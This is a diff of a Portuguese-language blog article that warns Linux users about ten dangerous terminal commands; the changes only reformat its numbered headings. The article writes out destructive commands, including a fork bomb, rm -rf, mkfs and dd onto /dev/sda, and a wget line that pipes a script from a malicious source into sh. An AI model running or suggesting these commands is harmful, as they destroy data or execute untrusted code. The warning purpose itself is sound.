@@ -18,7 +18,7 @@ introduction: "A linha de comando no GNU/Linux é muito produtiva, útil e inter
 A linha de comando no GNU/Linux é muito produtiva, útil e interessante, no entanto, às vezes pode ser muito perigoso, principalmente se tratando do usuário root, ou do usuário que pode assumir a maioria dos seus privilégios, o sudo. É necessário saber exatamente o que está fazendo. Esse artigo serve para alertá-los sobre alguns comandos do terminal, para não executá-los.
 
 
-1. rm -rf
+# 1. rm -rf
 
 O comando rm -rf é um dos maneira mais rápida de eliminar uma pasta e seu conteúdo. Mas um pouco de erro de digitação ou ignorância pode resultar em danos no sistema irrecuperáveis. Algumas das opções usadas com o comando rm é: 
 
@@ -36,7 +36,7 @@ comando rm no Linux é usado para apagar arquivos.
 
 Por isso, tenha cuidado quando você está executando o comando rm -rf. Para evitar um acidente de excluir arquivos com o comando 'rm', crie um alias de comando 'rm' como 'rm -i' ".bashrc", ele irá pedir-lhe para confirmar cada exclusão.
 
-2. :(){:|:&};:
+# 2. :(){:|:&};:
 
 {% highlight bash %}
 :(){:|:&};:
@@ -45,12 +45,12 @@ Por isso, tenha cuidado quando você está executando o comando rm -rf. Para evi
 A descrição acima é o fork bomb. Ele opera através da definição de uma função chamada ':', que se chama duas vezes, uma no primeiro plano e uma vez no fundo. Ele mantém em execução novamente e novamente até que o sistema congela.
 
 
-3. comando > /dev/sda
+# 3. comando > /dev/sda
 
 O comando acima escreve a saída do 'comando' no bloco /dev/sda. O comando acima escreve dados brutos e todos os arquivos no bloco serão substituídos por dados brutos, resultando em perda total dos dados no bloco.
 
 
-4. mv diretorio /dev/null
+# 4. mv diretorio /dev/null
 
 Tudo movido para /dev/null, desaparece do sistema.
 
@@ -58,13 +58,13 @@ Tudo movido para /dev/null, desaparece do sistema.
 mv /home/user/* /dev/null
 {% endhighlight %}
 
-5. wget http://malicious_source -O- | sh
+# 5. wget http://malicious_source -O- | sh
 
 O comando acima irá baixar um script a partir de uma fonte mal-intencionada e, em seguida, executá-lo. Comando wget irá baixar o script e sh irá executar o script baixado.
 
 > Nota: Você deve ser muito consciente da fonte de onde você está baixando pacotes e scripts. Só use esses scripts/aplicações que é baixado de uma fonte confiável.
 
-6. mkfs.ext3 /dev/sda
+# 6. mkfs.ext3 /dev/sda
 
 {% highlight bash %}
 mkfs.ext3 /dev/sda
@@ -72,7 +72,7 @@ mkfs.ext3 /dev/sda
 
 O comando acima irá danificar os blocos do seu HD, e formatá-lo.
 
-7. > arquivo
+# 7. > arquivo
 
 {% highlight bash %}
 echo "Nada" > arquivo.conf
@@ -93,12 +93,12 @@ echo "link pacote deb" >> /etc/apt/source.list
 {% endhighlight %}
 
 
-8. ^foo^bar
+# 8. ^foo^bar
 
 Este comando é usado para editar o comando anterior sem a necessidade de digitar novamente todo o comando novamente. Mas isso realmente pode ser problemático se você não tomou o risco de verificar cuidadosamente a mudança no comando original usando ^ ^ foo comando bar.
 
 
-9. dd if=/dev/random of=/dev/sda
+# 9. dd if=/dev/random of=/dev/sda
 
 {% highlight bash %}
 dd if=/dev/random of=/dev/sda
@@ -107,7 +107,7 @@ dd if=/dev/random of=/dev/sda
 O comando acima irá acabar com como */dev/sda* e escrever dados aleatórios para o bloco. Claro! Seu sistema seria deixado na fase inconsistente e irrecuperável.
 
 
-10. Comando invisível
+# 10. Comando invisível
 
 O comando abaixo nada mais é que o primeiro comando deste artigo (rm-rf). Aqui os códigos estão escondidos em hex para que um usuário ignorante pode ser enganado. Executando o código abaixo em seu terminal e limpar sua partição raiz.
 
